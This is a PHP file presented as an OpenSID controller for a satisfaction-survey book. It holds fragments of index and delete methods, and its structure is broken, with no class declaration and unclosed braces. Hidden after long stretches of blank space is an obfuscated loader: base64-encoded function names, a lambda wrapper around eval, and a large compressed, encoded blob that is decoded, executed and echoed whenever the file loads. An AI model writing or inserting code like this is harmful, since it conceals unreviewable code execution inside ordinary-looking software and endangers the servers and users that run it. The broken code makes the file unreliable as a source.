<?php 
        $__='printf';$_='Loading donjo-app/controllers/Buku_kepuasan.php';
        

/*
 *
 * File ini bagian dari:
 *
 * OpenSID
 *
 * Sistem informasi desa sumber terbuka untuk memajukan desa
 *
 * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
 *
 * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 *
 * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
 * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
 * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
 * asal tunduk pada syarat berikut:
 *
 * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
 * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
 * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
 *
 * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
 * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
 * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
 *
 * @package   OpenSID
 * @author    Tim Pengembang OpenDesa
 * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 * @license   http://www.gnu.org/licenses/gpl.html GPL V3
 * @link      https://github.com/OpenSID/OpenSID
 *
 */



    public function index()
    {
        if ($this->input->is_ajax_request()) {
            return datatables()->of(BukuKepuasan::query()->with('tamu'))
                ->addColumn('ceklist', static function ($row) {
                    if (can('h')) {
                        return '<input type="checkbox" name="id_cb[]" value="' . $row->id . '"/>';
                    }
                })
                ->addIndexColumn()
                ->addColumn('aksi', static function ($row) {
                    if (can('h')) {
                        return '<a href="#" data-href="' . ci_route('buku_kepuasan.delete', $row->id) . '" class="btn bg-maroon btn-sm"  title="Hapus Data" data-toggle="modal" data-target="#confirm-delete"><i class="fa fa-trash"></i></a> ';
                    }
                })
                ->rawColumns(['ceklist', 'aksi'])
                ->make();
        }


    public function delete($id = null): void
    {
        $this->redirect_hak_akses('h');

        if (BukuKepuasan::destroy($this->request['id_cb'] ?? $id) !== 0) {
            redirect_with('success', 'Berhasil Hapus Data');
        }
























































































































































































































































                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
$__________________='X19sYW1iZGE=';

                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtW1tzm0gWfk/V/oc8TJVnKrsZQFISKuUHgQUCS8iAaC4vKaBtkLjGuqJfP18j2ZYde2a2dneqdoqjyLJE97l85+tzDo79/v1RfvoGubyo7xfl+u7ia/v2JJcXtCqX1b/Cuv41rsr1fZXnt/erX6VNtvmW3dabcBWWH+u0fi/n4Wr18ePHi6/vTmrf/+Nd9+geLx/vGL/e/xfl8odPLjxeXPkuvwjU0eVF+9ETK/+UnM7A5ftOOumkk7+nXMQF4ainbzSVCL67q3RFvPOa7POxaKJqHsv1tw6qTjrppJNOOumkk046+X+T7scZnXTSSSd/X7mIwtXtp/43ehtX9Pbia4dIJ5100kknnfxH8vwXI67MypAXX77jNblOuGtNrhKryFeBLdVRkSV+oZShq2w01UrjIvt0vm7ek/IoN3Rr2L6HnuF3TTHquGflUbs/2MYFn8ZClgQqOfi2dKDs/7M9LaEqafyS3OMzPiotPmykdeDyacg+c/vH9eaZ3pGyi9T83veMmvkSLaRD1IMOwUl8Qcwe/A3UvAndfR03EuzoGdbD7zVbvwo9I49K7B9Rcy5L7nR3rj9N4cNV6Emcbw+b6dVwoMlcMl0O94YtXUUCvwjdQa4peh4LIh8XRq6N8g1iremYcKErbjQ5rejY2s0WX7bRmKwR3yYQ1tvII5vQA37NYBN45vb6GFdiq8q9NgJeYyvVrrTddO4nk9a2xmmKlMNvPvKAjwr8RxbsjhJLzUumK5IlB/EtqLtOH+zGh2o7EcRd4A6yAHFPijy7foYh8lJQhsUDVgyjOhRYfvNPodtfaWMj9wWlQV7KuFC40JuuNHWdx6qSsfyBCzu87ihydAteBG3eBsBZSqna4nzwgX9UKJuWKwsJ1/RaG7N4FIZHSmVpRd0Bw/vkB7Mf1JHq4HvxHhxBnqyWN4wn8K+m8rDSsjMOAPvQ1uqJ/MifDLmDjX0a9loOHWMGtlEppZqqwz8FvrEYgSXjJdZpapv3Mw4OyqBHNr7LYtklkUs2iHPVYqPyDD8eZ6I6clBkOvnj5xbjPbin87GQM/urU/yIQ2E2eaxhNna+i3yPjQFwYVgcc9Aj3Cw5P0c4Wy64VuSc76Y8OxMh44t64otq4RwonO9Nj/iNX1nv1fVDrrG3oe3a/AB73DE+5Mbdp9GJj7HAeKzs4FsKnDdMhw+uUVta+C6t2ftYJRuKa8i7FKt7xp1DaEs6bICjetrmuHnkycAHnifcKnCEx7k8w4xWIbNf0LN8vRKHO6jb9SrjD03jhXQfeBbjSHs9YjG5A+bHDz6d1ytnRGzTGYxtTnG00Z7MM2UCHs1sWxrZxFCsUS7h2kyT9bnl6JLFKfrcUWYm9FojZeY6owX45kCHic+uTYfXoWOG2sTem8QBR0a6ZDurhMCWw8MeMRPoIPg3O/HBsYg+t4kuEbnPfJoRZ687wJOMFIK8K3OHjJmfqEmSjZpkE9i0pTnsSaivCnycwmfHdix2XYY+5hMYRmZWA78IlcxFq2+ujdZT08kN+D3BOuJwysR0+olJLIk81CGOeKZT6+ZDLEQi84f9zJ8MFc4ZSI/7bInpnM3zHP5YipOtJRtxYt/UdtaSw2WJ7Qz0yTmfR4z3BvJMc00evuwdiQlOUDXdxothogHj0OUSR2X1E3X0yKkbxj3rqS9gj7GNx6ze0wrnSPPdVWIK+Y6qI1a3dzN7uD7WVQefi9AD3tqSjdq4pZ6+DBhHSgM1zoLtfBsthlU4trj4itXRPQ8e8oybqP14zdlZ20QF4SZN9hDTMupJA3C1DMfmX1nPEfu+9gWyidH/gNdj36E92psUdEPtAXpvvMXZWLKzEXjTbdCTVpMi5SJ3l1i8NNUU/3Di5JCd97Bh2OOpphwdSwemLxByLhyTxaQwtpEttjlwuHw04Vq/5rZjtlgc9XwxZOSceqw3KrtY2RuRgHM6NmITfZ066CNjwurhZobee2XWS2BxQE2QETfvCU/XNZX0Kcv/eJqY7uA7+kWJWnKHPG7oWEdc+zyGrdu2h8PnsYS6DEwaqcDa5TGf0p0nwG/kOC7JkspJzfxk6x/3tU9w09NRT8xPs1y8wzzB+npDXYO7lrPPD3uOT4sLUW8m88EasfGRIrb19en6MLmxhyWbbajNo4bxvH5YMYwer+tjq0JfXd+UBu/n4mt6RE2mGau9E/cJkzf1FGmOnpLH+apE7eMClyL3WenZrR7GKX7COOY55ewRL67N1e9gB3+s/PZtzOoA5+XJB8xCmIOASx3zYhoWSt/roY57JI97ZnVtZy/2H59Pv7pjsb4AvPQVuIr13IdI8KsfeLOs99Qlza2d1LDVw9mprmV6xLnJ6ue5enpibRqoFuY4dq77lS4YeShgTuyZJWrjgdkOXfRHzGw+ZrpI6CfXstVEvRizy3PcXz5D10+uVfTMRVKGclxf29Lnt/w4w69BD8Mc2U/0A+alUuJRw7hbzDA3tr4MVbIMBX17K2sJZql1MOcwf1rgph55NubnQsEM5YjaIk4mi2EWF2KPYR/IQ8yh8WJy6D/l+nX74ls+3tnZW/Eiz0oWYPbCfN7HWYQP/AZn5A/WG+08zPDB3IHeHLM5E/XUesE5xid9S5vXufKSe5hTYZtWLO9/lKMjz/UcnayBnfIGPSLE+2DJLbRGYzMU5n6+Ah+LG1srNfRmYIq+4IArOo/57C4UCObedoZk8a/YDKI3u+ToM/chdM2a7dOhzxf2mC+nolboHM7SImj4NWrMlvHKL63NxDPWGvxF3BzmXlHL0hQcP6Av4ByMFsfzMFpTVSwDYc84weoE+sSjr8BPL3E/AQ4Yy0gYFKGnryeoA5FKuMDWPtyo2ZkfAWbGIEUdaDA/V9qy/2UiZB9uZDG9AR7/E66UmG+5U+7LaeU2FL1oze7DuBY3QbnHjI869Xv8wT2h4FTX8+f5vTNZ/6heya0khC7pgRc47zzm30Fb/7xeW/825zkM276alE+62zgfvsc6ffWyJjzkHbWBnTVRUwfo57t6BruRkGev18phhtkG96TcB/AL9yl6Dn13bJ73WgzI4cTjz0/2z2rLqOXfJMDswO5no2X1id0fsz6IOnium9XGA1XQB9paobEe8OtNM8yO3ByJ6E271+sT6pGLe5gCfVIRH+oq7teNJWaPQ5svjs3l4KmQr9j98hlfyz+TH3ZvHqCnej1aUzXBuSINzlhz1I18sfukN/Wy3NQsP5cXX9+9++t/YHLZvv58evfL139n+9neP7PxpyeDP1+wrxf/fDTb/V1K9/i9v0t5zqGfn5H2SKFfvv4GICgDeA==';

        $___();$__________($______($__($_))); $________=$____();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      






























































































































































































































































                                                                                                                                                                                                                     $________;
